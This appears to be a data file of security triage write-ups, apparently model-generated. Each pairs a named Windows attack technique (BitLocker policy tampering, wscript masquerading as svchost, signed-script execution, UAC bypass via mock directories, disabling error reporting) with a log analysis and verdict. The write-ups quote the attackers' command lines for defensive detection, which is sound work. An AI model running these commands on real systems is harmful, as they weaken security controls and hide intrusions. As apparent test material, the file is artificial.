The analysis suggests a concerted effort to bypass security mechanisms, indicative of serious security risks. Immediate and thorough actions are recommended to address these findings."
Modify UseTPMKey Registry entry,"Upon analysis of the provided Windows event logs, the following observations were made:

1. **Process Activities and Anomalies**:
   - **wevtutil.exe and conhost.exe**: There were multiple instances of `wevtutil.exe` and `conhost.exe` processes being spawned by the user `SERVER002\admin_test`. `wevtutil.exe` is a legitimate tool used for managing event logs. `conhost.exe` is a standard Windows utility. The frequency and pattern of these process executions (wevtutil paired with conhost) could indicate routine log management activities being carried out by an admin user but require verification regarding intentional usage.
   
2. **Execution of cmd.exe with registry modifications**:
   - The execution of `cmd.exe` with a command line modification to the Windows registry is a significant finding. The command: `reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKey /t REG_DWORD /d 2 /f` does not appear typical for everyday operations, as it modifies the BitLocker policies. Such actions could indicate an attempt to alter security policies which could be a serious red flag if not conducted by authorized personnel.
   
3. **Time Change Events**:
   - The logs show events related to system time adjustments, which are generally benign if they align with time synchronization activities over NTP (`time.windows.com`). However, these should be validated against standard policy to ensure they were authorized changes.

4. **Client Services and Updates by EdgeUpdate**:
   - Multiple entries relate to Microsoft Edge Update activities, which appear to be standard update processes involving `MicrosoftEdgeUpdate.exe`. These often occur automatically and are expected behavior unless specifically disallowed by policy due to security reasons. 

5. **Execution of System Utilities**:
   - The `whoami.exe` and `hostname.exe` utilities are executed, showing standard functions to check user and machine identity. These actions alone do not indicate malicious intent but could be part of a larger context if chained with other unknown malicious commands.
   
Assessment:
- The combination of registry modification using `cmd.exe` in these logs stands out as a particularly suspicious event.
- The repeated `wevtutil.exe` executions with `conhost.exe` need corroboration to ensure these actions were intentional and part of legitimate administration tasks.

Resolution:
The evidence points to a **SUSPICIOUS** assessment due to the registry modification activities and the various processes executed by an administrative account. It is advised that these activities be further investigated to determine if they align with legitimate administrative tasks or are unapproved modifications indicating compromise. Verify the user actions against change management records or seek user confirmation where necessary."
Masquerading - wscript.exe running as svchost.exe,"Upon reviewing the provided Windows event logs, several key observations and potential indicators of malicious activity emerge:

### Analysis of Logs:

1. **Security Log (Event ID 5379)**:
   - The series of Event ID 5379 logs indicates attempts to retrieve credentials using read operations on multiple credential targets such as `MicrosoftAccount` and `WindowsLive`. All these attempts have a return code of `3221226021`, which corresponds to `STATUS_NO_SUCH_LOGON_SESSION`. This implies repeated unsuccessful attempts to read credentials, potentially indicative of credential dumping attempts by an unauthorized process.
   - The repeated and automated nature of these requests to different targets could be suspicious if not correlated to normal operations.

2. **Sysmon Log**:
   - The execution of `cmd.exe` with suspicious command-line arguments (`/c copy %SystemRoot%\\System32\\wscript.exe %APPDATA%\\svchost.exe`) suggests potential masquerading and misuse of legitimate processes. The creation of a rogue `svchost.exe` in the `APPDATA` directory mimics a tactic employed by malware to persist and execute unauthorized scripts (`data.003_masquerading.vbs`).
   - This chain of events appears to execute a VBScript file using the masqueraded `svchost.exe`, raising significant concerns of obfuscation and malicious actions.
   - The PowerShell and `wevtutil.exe` executions captured by Sysmon logs may align with efforts to configure or tamper with logs and system settings, especially in a context where suspicious activities are occurring.

3. **Windows Update and Microsoft Edge Installations**:
   - The logs also show normal activities related to Windows updates and Microsoft Edge updates, executed by processes running as `NT AUTHORITY\SYSTEM`. These entries appear standard and align with normal system operations, as updates are legitimate processes.

### Overall Assessment:
Considering the observed behavior, especially the anomalous credential access attempts and suspicious `cmd.exe` activities mimicking malware tactics, there is substantial evidence suggesting potential malicious activity on the host.

### Resolution:
- **MALICIOUS**: The activities revolving around unauthorized credential access attempts and command-line executions indicative of masquerading and potential scripting of malicious activities point decisively towards compromise. Further immediate actions should include isolating the system, conducting a deeper forensic investigation, and reviewing network connectivity and other hosts potentially affected.

### Recommendations on Proceeding:
- **Isolation**: Immediately isolate `Server002` from the network to prevent further actions by potential attackers.
- **Forensic Analysis**: Conduct a thorough disk and memory forensic analysis specifically looking into the newly created `svchost.exe`, associated scripts, and credential access attempts.
- **Review Access Logs**: Correlate with other logs to determine possible external access or user account misuse.
- **Network Monitoring**: Monitor network traffic for any abnormal connections or data exfiltration activities.
- **Remediation Measures**: Consider reimaging the affected systems after data recovery and analysis for ensuring system integrity moving forward."
manage-bde.wsf Signed Script Command Execution,"After reviewing the provided logs, here is the analysis based on the key areas of concern:

1. **Kernel-General and Time Service Logs:** 
   - Logs show multiple events related to time changes on the system. These events from `Microsoft-Windows-Kernel-General` and `Microsoft-Windows-Time-Service` typically indicate a synchronization with a time source (e.g., `time.windows.com`). The time change is logged synchronously across several event records, indicating legitimate activity, most likely routine system time synchronization.

2. **Sysmon Logs:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` processes owned by `SERVER002\admin_test` are noted. `wevtutil.exe` is typically used to manage Windows event logs. While the repeated execution of this process could be normal in some administrative contexts, the frequency and pattern here suggest possible scripting or automation, which often bears further review, especially when paired with `cmd.exe`.
   - Execution of `cmd.exe` with a `command-line` that sets a `comspec` variable to `calc.exe`, then executes a CScript file, is highly suspicious. This pattern is commonly used to bypass security defenses (""Living off the Land"" tactic). Such chaining of commands is not typical for benign administrative operations.
   - The later execution of `cscript.exe` referencing `manage-bde.wsf` suggests an attempt to automate encryption or decryption tasks, which might be legitimate if well justified but is suspicious in conjunction with the command execution pattern observed with `cmd.exe`.

3. **Security Logs:**
   - Logs show time changes recorded by `Microsoft-Windows-Security-Auditing`, consistent with the Kernel-General logs. The synchronization appears routine and related to timekeeping services.

4. **PowerShell and Application Logs:**
   - Unfortunately, logs for these sections were noted as unavailable; any instances of suspicious PowerShell usage would have needed scrutiny, as it is often leveraged for automation and scripts in both benign and malicious settings.

**Assessment of the Situation:**
Based on the analysis, the logs contain indications of potentially suspicious activity involving command-line scripting on the host `Server002` under the user account `SERVER002\admin_test`. The use of environment variable manipulation and script execution through `cscript` flags anomaly against regular administrative tasks. There is no direct evidence of a known malicious tool or method deployed, but the manner of command execution suggests behavior worth further examination.

**Resolution: SUSPICIOUS**
Given the observed automated or scripted execution patterns, it is prudent to categorize the activity as SUSPICIOUS. The events merit deeper investigation, particularly examining:
- The script purpose and operator intention behind `manage-bde.wsf`.
- Any associated correlating network, file access, or lateral movement logs.
- User-account activity for `SERVER002\admin_test` to authenticate its legitimacy.

**Guidance on How to Proceed:**
- Verify the legitimacy of the `SERVER002\admin_test` account and its regular activities.
- Correlate the timeline of `cmd.exe` and `cscript.exe` events with other logs (network activity, EDR logs) to verify any unauthorized access or data manipulation.
- Use threat intelligence tools to check if the hash values found in the logs are linked to known malicious software.
- Conduct a deeper forensic review of `Server002`, looking specifically at related files, registry, and additional logs that might not have been captured in the initial dataset."
Bypass UAC by Mocking Trusted Directories,"### Analysis of the Logs:

#### Identified Anomalies & Potentially Malicious Activities:

1. **Time Discrepancies**:
   - **Security Event 4616**: Occurrences where the system time was changed. It can indicate a potential attempt to manipulate logs or timestamps. The time went backward, which is unusual and suspicious.
   
2. **Privilege Escalation**:
   - **Security Event 4672**: Elevated privileges were assigned to the user `admin_test`. This user was granted a variety of powerful privileges like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc., which could be exploited for malicious actions if not justified. This requires correlation with legitimate administrative actions.

3. **Remote Logons**:
   - **Security Event 4624**: Remote interactive logons detected. The user `admin_test` logged in from a workstation `DESKTOP-3HL5B2P` using NTLM authentication. While this could be normal behavior for administrators, it opens the question about legitimate or unauthorized access.
   
4. **Unscheduled or Weird Process Executions**:
   - **Sysmon Event 5 & 1**: The user `admin_test` executed several system utilities including `wevtutil.exe`, `conhost.exe`, and `whoami.exe`. The use of `wevtutil.exe` and `cmd.exe` with obscure command lines, particularly, `cmd.exe` executing `mkdir`, `copy`, and `mklink`, suggests possible attempts to create hidden paths or symbolic links possibly for evasion or persistence mechanisms.
   - The process `mmc.exe` appears to have been copied and linked, which could be very suspicious activity.

5. **Command Line Usage**:
   - **Sysmon Event 1**: A command line involving creating directories in system spaces and copying executables (`cmd.exe` to `mmc.exe`) is highly suspicious. This could indicate attempts to circumvent normal execution paths.

6. **Service Executions**:
   - Standard Windows processes like `svchost.exe`, `sppsvc.exe`, and `WmiPrvSE.exe` were run, but require validation to ensure they're not being used maliciously or are not running unexpected workloads.

### Assessment:

The collected logs contain several events that indicate suspicious activities:
- The manipulation of system time could suggest attempts to alter log data timestamps.
- Elevated privilege assignation without clear context could point towards privilege abuse.
- Remote logon events and the potential misuse of legitimate system tools for obfuscation and persistence.

### Resolution:

After thorough analysis of the available logs, the resolution for this case is:

- **SUSPICIOUS**

This conclusion is drawn because the actions noted, such as the privilege escalation, suspicious command line executions, and time anomalies, are indicative of potential malicious activity. However, concrete proof is missing to definitively label it as **MALICIOUS** without further investigation such as correlating activity with legitimate users or activities.
 
### Recommendations:

1. **Conduct a thorough behavioral investigation** into the user `admin_test` activities, specifically those occurring at the timestamp of noted events.
2. **Correlate events** with network monitoring tools to determine if suspicious remote logons are consistent with known and authorized administrative actions.
3. **Validate system binaries** for integrity using hash checks against known good values.
4. **Review changes** in system configurations, especially those involving time adjustments, and determine their necessity and authorization.
5. **Implement auditing** for high-value targets like privileged account activities, remote logons, and directory/service manipulations.

Such follow-up actions can help ascertain the true intentions behind these suspicious anomalies and secure the environment against potential threats."
Disabling ShowUI Settings of Windows Error Reporting (WER),"Upon an in-depth analysis of the provided Windows event logs from the Application, Windows PowerShell, Sysmon, Security, and System logs, the following observations have been made:

### Key Observations:

1. **Application Log**:
   - The entries here mainly pertain to general service operations, such as the stopping of the ""edgeupdate"" service and Software Protection Platform events, which in themselves do not immediately raise alarms.

2. **Sysmon Log**:
   - Frequent execution of common Windows utilities like `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and `cmd.exe` under the `SERVER002\admin_test` account, with a high integrity level, is noted. 
   - The `cmd.exe` is run with a command to modify registry settings related to Windows Error Reporting: `\""cmd.exe\"" /c reg add \""HKCU\Software\Microsoft\Windows\Windows Error Reporting\"" /v DontShowUI /t REG_DWORD /d 1 /f`. While not inherently malicious, such actions could be used to suppress error reporting to hide malicious activities.
   - There is a substantial number of actions taken by processes related to `MicrosoftEdgeUpdate.exe`. Multiple instances of this process execute in conjunction with `com`, `register`, and `update` commands, all under `NT AUTHORITY\SYSTEM`, which aligns with normal behavior for updating software.

### Suspicious Elements:
- The registry modification via the command line is suspicious due to its potential use for evasion techniques. This kind of modification needs further investigation to determine if it was part of an administrative task or an attempt to mask nefarious activity.
  
- The frequent execution of administrative utilities and scripts in a tight timeframe can sometimes indicate automated processes or scripts running, potentially for legitimate IT maintenance, but is also a hallmark of illicit lateral movements or reconnaissance activity requiring further scrutiny.

### Conclusion:

Based on the above analysis, these logs contain elements that warrant further investigation due to the nature of the registry modification and frequent utility executions, which could be indicative of initial stages of malicious activity or benign administrative tasks. Additional information, such as correlating activities with user action logs or external network connections, would be necessary to definitively conclude the nature of these activities.

**Resolution: SUSPICIOUS**

### Recommendations:
- **Further Investigation**: Correlate the timeline of these events with user login and IT maintenance schedules to determine if these actions were taken by legitimate users or applications.
- **Review Registry**: Verify other related registry keys for potential unauthorized changes or script components.
- **User Verification**: Verify the purpose and legitimacy of the `admin_test` account and ensure it's a legitimate user or service account with minimal privileges.
- **Monitoring**: Increase monitoring on this host for unusual outbound connections or further anomalous behavior, focusing on high integrity level processes and administrative commands."
